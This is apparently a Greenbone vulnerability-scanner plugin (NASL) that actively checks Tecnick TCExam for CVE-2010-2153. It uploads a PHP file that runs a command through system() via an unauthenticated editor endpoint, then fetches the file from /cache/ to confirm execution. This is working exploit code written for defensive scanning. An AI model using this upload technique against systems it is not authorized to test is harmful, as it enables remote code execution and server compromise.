# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:tecnick:tcexam";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800793");
  script_version("2025-01-22T05:38:11+0000");
  script_tag(name:"last_modification", value:"2025-01-22 05:38:11 +0000 (Wed, 22 Jan 2025)");
  script_tag(name:"creation_date", value:"2010-06-11 14:27:58 +0200 (Fri, 11 Jun 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2010-2153");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Tecnick TCExam < 10.1.012 File Upload Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_tecnick_tcexam_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("tecnick/tcexam/http/detected");

  script_tag(name:"summary", value:"Tecnick TCExam is prone to a file upload vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to the access and input validation errors in
  the '/admin/code/tce_functions_tcecode_editor.php' script when uploading files.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to upload PHP
  scripts and execute arbitrary commands on a web server.");

  script_tag(name:"affected", value:"Tecnick TCExam version 10.1.010 and prior.");

  script_tag(name:"solution", value:"Update to version 10.1.012 or later.");

  script_xref(name:"URL", value:"http://cross-site-scripting.blogspot.com/2010/06/tcexam-101006-arbitrary-upload.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

vt_strings = get_vt_strings();
bound = "_" + vt_strings["default_rand"];
file = vt_strings["default"] + rand() + ".php";

cmds = exploit_commands();

url = dir + "/admin/code/tce_functions_tcecode_editor.php";

foreach pattern (keys(cmds)) {

  headers = make_array("Origin", "null",
                       "Content-Type", "multipart/form-data; boundary=" + bound,
                       "Cookie", "LastVisit=1275442604");

  data = '--' + bound + '\r\n' +
         "Content-Disposition: form-data; name='sendfile0'" + '\r\n\r\n' +
         file + '\r\n' +
         '--' + bound + '\r\n' +
         "Content-Disposition: form-data; name='userfile0'; filename='" + file + "'" + '\r\n' +
         'Content-Type: application/octet-stream\r\n\r\n' +
         '<?php system(' + "'" + cmds[pattern] + "'" + '); unlink(__FILE__); ?>\r\n' +
         '--' + bound + '--\r\n\r\n';

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  http_keepalive_send_recv(port: port, data: req);

  url = dir + "/cache/" + file;

  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    report = 'It was possible to execute the command "' + cmds[pattern] + '".\r\n\r\nResult:\r\n\r\n' +
             res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
